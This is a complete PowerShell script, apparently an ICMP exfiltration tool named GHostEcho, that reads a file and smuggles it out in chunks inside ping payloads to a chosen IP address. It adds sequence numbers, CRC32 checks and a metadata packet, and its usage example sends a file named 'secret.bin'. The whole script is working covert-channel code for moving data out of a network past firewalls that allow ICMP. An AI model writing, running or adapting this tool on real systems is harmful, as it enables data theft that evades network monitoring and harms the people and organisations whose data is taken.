<#
.SYNOPSIS
    Stream a file over ICMP in chunks (best-effort).  This variant probes the target to estimate RTT
    and prints an estimated total send time before starting.

USAGE:
  # 1) Dot-source (load into session) and call:
  . .\GHostEcho-Sender.ps1
  Send-GHostEcho -TargetIP 10.0.0.5 -FilePath .\secret.bin -ChunkSize 1200

  # 2) Execute directly:
  .\GHostEcho-Sender.ps1 -TargetIP 10.0.0.5 -FilePath .\secret.bin -ChunkSize 1200
#>

param(
    # made optional so dot-sourcing doesn't prompt; script will validate when executed directly
    [string]$TargetIP = $null,
    [string]$FilePath = $null,
    [int]$ChunkSize = 1200,
    [int]$DelayMs = 0,
    [int]$TimeoutMs = 4000,
    [int]$ProbeCount = 4
)

function Send-GHostEcho {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)][string]$TargetIP,
        [Parameter(Mandatory=$true)][string]$FilePath,
        [int]$ChunkSize = 1200,
        [int]$DelayMs = 0,
        [int]$TimeoutMs = 4000,
        [int]$ProbeCount = 4
    )

    Add-Type -AssemblyName System.Net
    Add-Type -AssemblyName System.Net.NetworkInformation

    # --- CRC32 (local, safe for Windows PowerShell) ---
    function Get-CRC32 {
        param([byte[]]$Bytes)

        if (-not $script:crc32_table) {
            $poly  = [Convert]::ToUInt32("EDB88320", 16)
            $table = New-Object 'System.UInt32[]' 256
            for ($i = 0; $i -lt 256; $i++) {
                $c = [uint32]$i
                for ($k = 0; $k -lt 8; $k++) {
                    if ( ($c -band [uint32]1) -ne 0 ) {
                        $c = [uint32]( ($c -shr 1) -bxor $poly )
                    } else {
                        $c = [uint32]( $c -shr 1 )
                    }
                }
                $table[$i] = $c
            }
            $script:crc32_table = $table
        } else {
            $table = $script:crc32_table
        }

        $crc = [uint32]::MaxValue
        foreach ($b in $Bytes) {
            $idx = [int]( ($crc -bxor [uint32]$b) -band 0xFF )
            $crc = [uint32]( ($crc -shr 8) -bxor $table[$idx] )
        }
        $crc = [uint32]( $crc -bxor [uint32]::MaxValue )

        return ('{0:x8}' -f $crc)
    }

    # --- Helper: format milliseconds to human-friendly string ---
    function Format-TimeSpan {
        param([int64]$ms)
        if ($ms -lt 0) { return "unknown" }
        $s = [math]::Floor($ms/1000)
        $h = [math]::Floor($s/3600)
        $m = [math]::Floor(($s % 3600) / 60)
        $sec = $s % 60
        if ($h -gt 0) {
            return ("{0}h {1}m {2}s" -f $h, $m, $sec)
        } elseif ($m -gt 0) {
            return ("{0}m {1}s" -f $m, $sec)
        } else {
            return ("{0}s" -f $sec)
        }
    }

    # --- Robust inline status writer (local) ---
    function Write-InlineStatus {
        param([string]$text)
        # fallback to simple Write-Host if output redirected
        if ([Console]::IsOutputRedirected) {
            Write-Host $text; return
        }
        if (-not $script:prevStatusLen) { $script:prevStatusLen = 0 }
        try {
            [Console]::SetCursorPosition(0, [Console]::CursorTop)
            if ($script:prevStatusLen -gt $text.Length) {
                $out = $text + (' ' * ($script:prevStatusLen - $text.Length))
            } else {
                $out = $text
            }
            [Console]::Write($out)
            $script:prevStatusLen = $out.Length
        } catch {
            Write-Host $text
        }
    }

    # Resolve file path (script-relative if not absolute)
    $cwd = if ($PSScriptRoot) { $PSScriptRoot } else { (Get-Location).Path }
    $fullPath = if ([System.IO.Path]::IsPathRooted($FilePath)) { $FilePath } else { Join-Path -Path $cwd -ChildPath $FilePath }

    if (-not (Test-Path $fullPath)) {
        throw "File not found: $fullPath"
    }

    $fileInfoName = [System.IO.Path]::GetFileName($fullPath)
    $fileSize = (Get-Item $fullPath).Length
    $totalChunks = [math]::Ceiling($fileSize / $ChunkSize)

    # Create Ping object for probing/measurements
    $ping = New-Object System.Net.NetworkInformation.Ping

    # --- Probe target to estimate RTT ---
    $sumRTT = 0
    $succ = 0
    for ($i = 0; $i -lt $ProbeCount; $i++) {
        try {
            $probe = $ping.Send($TargetIP, $TimeoutMs)
            if ($probe -and $probe.Status -eq "Success") {
                $sumRTT += $probe.RoundtripTime
                $succ++
            }
        } catch {
            # ignore
        }
        Start-Sleep -Milliseconds 100
    }

    if ($succ -gt 0) {
        $avgRTT = [math]::Round($sumRTT / $succ)
        $rttSource = "measured (avg of $succ/$ProbeCount probes)"
    } else {
        $avgRTT = $TimeoutMs
        $rttSource = "fallback (no replies; using TimeoutMs)"
    }

    $perPacketMs = $avgRTT + $DelayMs
    $estimatedTotalMs = [int64]( $avgRTT + ($totalChunks * $perPacketMs) )
    $etaText = Format-TimeSpan -ms $estimatedTotalMs

    Write-Host ("Preparing to send '{0}' ({1} bytes) to {2} in {3} chunks (chunk size {4} bytes)" -f $fileInfoName, $fileSize, $TargetIP, $totalChunks, $ChunkSize)
    Write-Host ""
    Write-Host ("Estimated total time: {0} — per-packet ≈ {1} ms (avg RTT {2} ms; DelayMs {3} ms). RTT source: {4}" -f $etaText, $perPacketMs, $avgRTT, $DelayMs, $rttSource)
    $lowerBoundMs = [int64]( $totalChunks * $DelayMs )
    Write-Host ("Lower bound (network delay ignored): {0}" -f (Format-TimeSpan -ms $lowerBoundMs))
    Write-Host ""
    Write-Host "Starting transfer..."

    # Send metadata (best-effort)
    $meta = "FileName:$fileInfoName`nFileSize:$fileSize`nTotalChunks:$totalChunks`nChunkSize:$ChunkSize"
    $metaBytes = [System.Text.Encoding]::ASCII.GetBytes($meta)
    if ($metaBytes.Length -gt 512) { $metaBytes = $metaBytes[0..511] }

    try {
        $r = $ping.Send($TargetIP, $TimeoutMs, $metaBytes)
        if ($r -and $r.Status -eq "Success") { Write-Host "Metadata sent." } else { Write-Host ("Metadata send returned {0}" -f ($r.Status)) }
    } catch {
        Write-Host ("[!] Exception sending metadata: {0}" -f $_)
    }

    # Throttle display frequency
    $DisplayEvery = 5

    # Open file and stream
    $fs = [System.IO.File]::OpenRead($fullPath)
    try {
        $buffer = New-Object byte[] $ChunkSize
        $seq = 0
        $totalSent = 0
        $delim = [byte]0x7C

        while ($true) {
            $bytesRead = $fs.Read($buffer, 0, $ChunkSize)
            if ($bytesRead -le 0) { break }

            if ($bytesRead -eq $ChunkSize) {
                $payload = [byte[]]$buffer.Clone()
            } else {
                $payload = New-Object byte[] $bytesRead
                [Array]::Copy($buffer, 0, $payload, 0, $bytesRead)
            }

            $crchex = Get-CRC32 -Bytes $payload
            $crcBytes = [System.Text.Encoding]::ASCII.GetBytes($crchex)

            $seqBytes = [BitConverter]::GetBytes([int]$seq)
            $packetLength = $seqBytes.Length + 1 + $crcBytes.Length + 1 + $payload.Length
            $packet = New-Object byte[] $packetLength

            $offset = 0
            [Array]::Copy($seqBytes, 0, $packet, $offset, $seqBytes.Length); $offset += $seqBytes.Length

            $packet[$offset] = $delim; $offset += 1
            [Array]::Copy($crcBytes, 0, $packet, $offset, $crcBytes.Length); $offset += $crcBytes.Length

            $packet[$offset] = $delim; $offset += 1
            [Array]::Copy($payload, 0, $packet, $offset, $payload.Length)

            try {
                $reply = $ping.Send($TargetIP, $TimeoutMs, $packet)
            } catch {
                [Console]::WriteLine("")  # newline before error
                Write-Host ("[!] Exception sending chunk {0}: {1}" -f $seq, $_)
                throw
            }

            $totalSent += $bytesRead

            if (($seq % $DisplayEvery) -eq 0) {
                $statusLine = ("Sent chunk {0}/{1} seq {2} — {3:N0}/{4:N0} bytes" -f ($seq+1), $totalChunks, $seq, $totalSent, $fileSize)
                if (-not ($reply -and $reply.Status -eq 'Success')) {
                    $statusLine += " (ping: $($reply.Status))"
                }
                Write-InlineStatus -text $statusLine
            }

            $seq++
            if ($DelayMs -gt 0) { Start-Sleep -Milliseconds $DelayMs }
        }

        try { [Console]::SetCursorPosition(0, [Console]::CursorTop); [Console]::WriteLine("") } catch { Write-Host "" }
    } finally {
        $fs.Close()
        $fs.Dispose()
    }

    Write-Host ("Done. Sent {0} bytes in {1} chunks." -f $totalSent, $seq)
}

# If the script was executed directly (not dot-sourced), call the function using the top-level params.
# When dot-sourced (". .\GHostEcho-Sender.ps1") $MyInvocation.InvocationName equals '.'
if ($MyInvocation.InvocationName -ne '.') {
    if (-not $TargetIP -or -not $FilePath) {
        Write-Host "Usage: .\GHostEcho-Sender.ps1 -TargetIP <ip> -FilePath <path> [-ChunkSize N] [-DelayMs N] [-TimeoutMs N] [-ProbeCount N]"
        exit 1
    }
    Send-GHostEcho -TargetIP $TargetIP -FilePath $FilePath -ChunkSize $ChunkSize -DelayMs $DelayMs -TimeoutMs $TimeoutMs -ProbeCount $ProbeCount
}

# End of file
